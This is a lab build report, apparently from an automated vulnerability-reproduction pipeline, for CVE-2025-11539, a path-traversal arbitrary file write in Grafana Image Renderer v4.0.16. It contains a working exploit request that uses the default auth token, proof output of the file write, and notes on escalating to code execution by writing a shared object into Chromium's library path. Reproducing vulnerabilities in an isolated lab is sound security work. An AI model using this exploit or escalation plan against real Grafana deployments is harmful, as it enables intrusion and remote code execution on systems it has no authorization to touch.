# Lab Build Report: CVE-2025-11539

## Lab Architecture

**Multi-container setup** with two services:

| Container | Role | Image | Port |
|-----------|------|-------|------|
| `cve-2025-11539-grafana` | Grafana dashboard (provides URLs for the renderer to navigate to) | `grafana/grafana:11.6.0` | 3000 |
| `cve-2025-11539-renderer` | **Vulnerable** Grafana Image Renderer v4.0.16 (arbitrary file write via path traversal) | Built from source | 8081 |

### Why Multi-Container

The renderer connects to Grafana via configurable HTTP URLs (`GF_RENDERING_SERVER_URL`, `GF_RENDERING_CALLBACK_URL`), making multi-container with Docker networking the correct architecture. Container names resolve as DNS hostnames on the shared `lab-net` network.

## Container Details

### Grafana (`cve-2025-11539-grafana`)

- **Image**: `grafana/grafana:11.6.0`
- **Network**: `lab-net` (internal)
- **Port**: 3000 (internal only)
- **Environment**:
  - `GF_RENDERING_SERVER_URL=http://cve-2025-11539-renderer:8081/render`
  - `GF_RENDERING_CALLBACK_URL=http://cve-2025-11539-grafana:3000/`
  - `GF_AUTH_ANONYMOUS_ENABLED=true` (anonymous access enabled for renderer)
  - `GF_AUTH_ANONYMOUS_ORG_ROLE=Admin`
- **Health check**: `wget -O- -q http://localhost:3000/api/health`

### Vulnerable Renderer (`cve-2025-11539-renderer`)

- **Image**: Built from source (v4.0.16 tag, commit `3998b13`)
- **Base**: `node:22-bookworm` with system Chromium
- **Networks**: `lab-net` (internal)
- **Port**: 8081 (internal)
- **Auth Token**: `-` (default from `default.json`, configured in `config.json`)
- **Environment**:
  - `CHROME_BIN=/usr/bin/chromium`
  - `PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true`
  - `NODE_ENV=production`
- **Entry point**: `tini -- node build/app.js server --config=config.json`
- **Health check**: `wget -O- -q http://localhost:8081/`
- **Node.js version**: v22.22.0

## Network Topology

```
Attacker (host) ──[localhost:8081]──> cve-2025-11539-renderer:8081
                                              │
                                         [lab-net]
                                              │
                                    cve-2025-11539-grafana:3000
```

The renderer is on `lab-net` (to reach Grafana) and exposes port 8081 to the host for PoC access.

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| Grafana | ✅ Pulled successfully | Official image `grafana/grafana:11.6.0` |
| Renderer | ✅ Built successfully | From source at v4.0.16 with `node:22-bookworm` base + system Chromium |
| Docker Compose | ✅ All services healthy | Both containers healthy, networking functional |

### Build Details

The renderer Dockerfile uses a simplified single-stage build:
1. `node:22-bookworm` base image
2. `apt-get install chromium` + fonts + tini + locales
3. `yarn install --pure-lockfile` + `yarn run build` (TypeScript → JavaScript)
4. Production dependency install (`yarn install --pure-lockfile --production`)
5. `default.json` copied as `config.json` (preserves default auth token `-`)

## Start/Stop Commands

```bash
# Start lab
docker compose build
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs renderer

# Stop lab
docker compose down
```

## Verification Evidence

### 1. Containers Running and Healthy

```
NAME                      IMAGE                     STATUS                    PORTS
cve-2025-11539-grafana    grafana/grafana:11.6.0    Up (healthy)              3000/tcp
cve-2025-11539-renderer   cve-2025-11539-renderer   Up (healthy)              8081/tcp
```

### 2. Renderer Reachable

```bash
curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/"
# Result: 200
```

### 3. Default Auth Token Active

```json
{"authToken": "-"}
```

The `X-Auth-Token: -` header authenticates successfully.

### 4. Vulnerable Code Path Confirmed

- `assertNoPathTraversal` function **does NOT exist** in `build/browser/browser.js` (grep returns 0 matches)
- `options.filePath` is passed directly to `page.screenshot({ path: options.filePath })` and `fs.copyFileSync(downloadFilePath, options.filePath)` without any validation

### 5. Arbitrary File Write Demonstrated

Sent render request with path traversal:
```
GET /render?url=http://cve-2025-11539-grafana:3000/login&filePath=/tmp/cve_test_pwned.png&width=100&height=100&timeout=30
X-Auth-Token: -
```

**Result**: File was written to `/tmp/cve_test_pwned.png` inside the renderer container:
```
-rw-r--r-- 1 root root 3948 Feb 28 17:55 /tmp/cve_test_pwned.png
/tmp/cve_test_pwned.png: PNG image data, 100 x 100, 8-bit/color RGB, non-interlaced
```

The file was subsequently deleted by the application's cleanup callback (expected behavior), but the evidence copy at `/tmp/evidence_copy.png` confirms the arbitrary file write occurred.

## Accessing the Renderer

```bash
# Send authenticated request via port-mapped endpoint
curl -H "X-Auth-Token: -" "http://localhost:8081/render?url=http://cve-2025-11539-grafana:3000/login&filePath=/tmp/test.png&width=100&height=100&timeout=30"
```

## PoC Notes

### Important Behavior: Post-Send File Cleanup

Both `/render` and `/render/csv` endpoints **delete the file after sending the response**:

```javascript
res.sendFile(result.filePath, (err) => {
    fs.unlinkSync(result.filePath);  // /render (sync)
    // OR
    fs.unlink(result.filePath, ...); // /render/csv (async)
});
```

This means the file IS written to the attacker-controlled path (proving the vulnerability) but is cleaned up after the HTTP response completes. The PoC agent should account for this:

1. **Simplest proof**: Use a filesystem watcher or rapid polling (`docker exec`) to catch the file before cleanup, as demonstrated above
2. **Full exploitation proof**: Write a shared object to Chromium's library search path — it gets loaded when the next Chromium process spawns (before the HTTP response completes and cleanup runs)
3. **Alternative**: Write to a path where cleanup will fail (e.g., a path the process can write to but not delete from)

### Attack Vectors

| Endpoint | Content Control | Best For |
|----------|----------------|----------|
| `/render` | Limited (PNG/PDF screenshot) | Simple file write proof |
| `/render/csv` | Full (attacker controls download content via URL) | RCE escalation via malicious binary write |

### Authentication

All requests require `X-Auth-Token: -` header (default token).

## Known Issues

1. **Browser uncaught exception**: The renderer logs `TypeError: Cannot read properties of undefined (reading 'keys')` on some render requests. This appears to be a non-fatal error related to Chromium version compatibility — renders still complete successfully.
2. **File cleanup**: As noted above, the application deletes files after sending responses. This is expected behavior and does not prevent exploitation — the vulnerability is the arbitrary file write primitive itself.

## Lab Files

| File | Description |
|------|-------------|
| `Dockerfile.vulnerable` | Builds Grafana Image Renderer v4.0.16 from source |
| `docker-compose.yml` | Two-container lab: Grafana + vulnerable renderer |
